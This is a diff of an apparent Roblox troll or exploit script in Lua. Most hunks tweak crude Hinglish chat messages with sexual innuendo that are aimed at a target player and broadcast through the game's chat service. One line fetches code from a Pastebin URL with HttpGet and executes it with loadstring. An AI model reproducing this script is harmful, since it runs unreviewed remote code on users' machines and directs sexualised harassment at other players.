@@ -955,7 +955,7 @@ do
 		if playerGender == "girl" then
 			messages[3] = "SUN " .. targetName .. " AB TU GYI KYUKI 🎀 CUTIE " .. playerName .. " NE V3 LOAD KIYA 😍👌🏼"
 		else
-			messages[3] = "👽 " .. targetName .. "YOUR PAPA 😍 " .. playerName .. " NE APNA V3 LOAD KRLIYA 👽🫴🏼, ENJOY THE SHOW 👌🏼"
+			messages[3] = "👽 " .. targetName .. " YOUR PAPA 😍 " .. playerName .. " NE APNA V3 LOAD KRLIYA 👽🫴🏼, ENJOY THE SHOW 👌🏼"
 		end
 	end
 
@@ -2302,10 +2302,10 @@ loadstring(game:HttpGet("https://pastebin.com/raw/rnZWws3z"))() end)
 btn("BANGER 2💀", P6, function() 
 local message = "SCRIPT BY " .. playerName
 .. " \----------//----------\----------// "
-.. "BANGER 2.0 💥😈 "
-.. "______ 👽☠️ "
-.. "TARGET BE LIKE: AB TO MERI C ME 🤭 😭😂 "
-.. "-______ "
+.. "BANGER 2 💀"
+.. "_"
+.. "TARGET BE LIKE: AB TO MERI C ME 😭😂 "
+.. "____ "
 .. "MADE BY " .. playerName
 .. " | BANGER V2 LOADED 💀🔥..."
 
@@ -2328,8 +2328,8 @@ local message = "SCRIPT BY " .. playerName
     .. "---"
     .. "😈💀---"
     .. "TARGET BE LIKE: YE KYA AA GAYA 😭👽 "
-    .. "----------//----------\\----------//---------- "
-    .. "BUILT DIFFERENT BY " .. playerName
+    .. "___ "
+    .. "MADE BY 🗿 " .. playerName
     .. " | BANGER 3 LOADED 🥶🔥..."
 
 local channel = game:GetService("TextChatService")
